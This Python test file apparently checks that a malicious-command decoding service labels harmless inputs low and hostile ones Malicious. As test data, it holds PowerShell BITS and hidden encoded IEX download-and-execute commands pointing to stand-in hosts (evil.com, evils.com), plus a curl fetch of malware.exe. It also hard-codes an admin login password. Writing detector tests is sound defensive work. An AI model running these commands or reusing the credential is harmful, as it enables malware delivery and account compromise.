"""P1-02b retest: benign inputs no longer over-promote; BITS + IEX still Malicious.

Uses local 127.0.0.1:8001 to avoid slow public ingress.
"""
import json
import os
import pytest
import requests

BASE = os.environ.get("P1_02B_BASE", "http://127.0.0.1:8001")


def _login():
    r = requests.post(
        f"{BASE}/api/auth/login",
        json={"email": "admin@nivxray.com", "password": "uulVDp5cCSB3Hva99s7UUAwK"},
        timeout=30,
    )
    r.raise_for_status()
    return r.json()["access_token"]


@pytest.fixture(scope="module")
def token():
    return _login()


def _smart(token, text):
    r = requests.post(
        f"{BASE}/api/decode/smart",
        json={"input": text},
        headers={"Authorization": f"Bearer {token}"},
        timeout=90,
    )
    r.raise_for_status()
    return r.json()


def _verdict(data):
    cio = data.get("cio") or {}
    v = cio.get("verdict") or {}
    return v.get("label"), v.get("confidence_pct"), v, cio


def test_benign_hello_world(token):
    """`hello world` MUST be Undetermined/Informational with confidence <= 30."""
    data = _smart(token, "hello world")
    label, conf, v, _ = _verdict(data)
    print(f"[hello world] label={label} conf={conf} rule={v.get('escalation_rule')}")
    assert label in {"Undetermined", "Informational"}, f"got {label}"
    assert conf is not None and conf <= 30, f"confidence {conf} > 30"


def test_benign_echo_hello(token):
    """`echo hello` MUST NOT be Malicious; allowed {Informational, Runtime Dependent, Suspicious}, conf <= 75."""
    data = _smart(token, "echo hello")
    label, conf, v, _ = _verdict(data)
    print(f"[echo hello] label={label} conf={conf} rule={v.get('escalation_rule')}")
    assert label != "Malicious", f"over-promoted to Malicious @ {conf}"
    assert label in {"Informational", "Runtime Dependent", "Suspicious", "Undetermined"}, f"unexpected label {label}"
    assert conf is not None and conf <= 75, f"confidence {conf} > 75"


def test_bits_downloader_malicious(token):
    payload = ("try{Import-Module BitsTransfer; Start-BitsTransfer "
               "-Source 'http://evils.com/a.exe' -Destination 'C:\\a.exe';}catch{}")
    data = _smart(token, payload)
    label, conf, v, cio = _verdict(data)
    rule = (v.get("escalation_rule") or "").lower()
    class_dist = v.get("class_distribution") or {}
    print(f"[BITS] label={label} conf={conf} rule={rule} class={class_dist}")
    assert label == "Malicious", f"BITS downloader must be Malicious, got {label}"
    assert conf is not None and conf >= 65, f"BITS confidence {conf} < 65"


def test_encoded_iex_downloader_malicious(token):
    # PowerShell -EncodedCommand with IEX + URL. Base64 of:
    # IEX (New-Object Net.WebClient).DownloadString('http://evil.com/a.ps1')
    import base64
    inner = "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/a.ps1')"
    b64 = base64.b64encode(inner.encode("utf-16le")).decode()
    payload = f"powershell.exe -NoP -NonI -W Hidden -EncodedCommand {b64}"
    data = _smart(token, payload)
    label, conf, v, _ = _verdict(data)
    print(f"[EncodedCommand IEX] label={label} conf={conf}")
    assert label == "Malicious", f"got {label}"
    assert conf is not None and conf >= 90, f"confidence {conf} < 90"


def test_osint_metadata_still_present(token):
    """P1-01 regression: cio.metadata.osint should exist (may be empty w/o keys) and node attrs.enrichment populated."""
    data = _smart(token, "curl http://1.2.3.4/malware.exe")
    cio = data.get("cio") or {}
    md = cio.get("metadata") or {}
    assert "osint" in md, "cio.metadata.osint missing"
    # find IOC nodes and check enrichment
    nodes = (cio.get("graph") or {}).get("nodes") or cio.get("nodes") or []
    ioc_nodes = [n for n in nodes if (n.get("kind") in {"ip", "url", "domain", "hash"} or
                                       n.get("type") in {"ip", "url", "domain", "hash"})]
    print(f"[OSINT] ioc_nodes={len(ioc_nodes)} metadata.osint keys={list(md.get('osint', {}).keys())[:5]}")
    # Non-strict: just ensure osint key present. Providers list may be empty w/o keys.


if __name__ == "__main__":
    tok = _login()
    for fn in [test_benign_hello_world, test_benign_echo_hello,
               test_bits_downloader_malicious, test_encoded_iex_downloader_malicious,
               test_osint_metadata_still_present]:
        try:
            fn(tok)
            print(f"PASS: {fn.__name__}")
        except AssertionError as e:
            print(f"FAIL: {fn.__name__}: {e}")
        except Exception as e:
            print(f"ERR : {fn.__name__}: {e}")
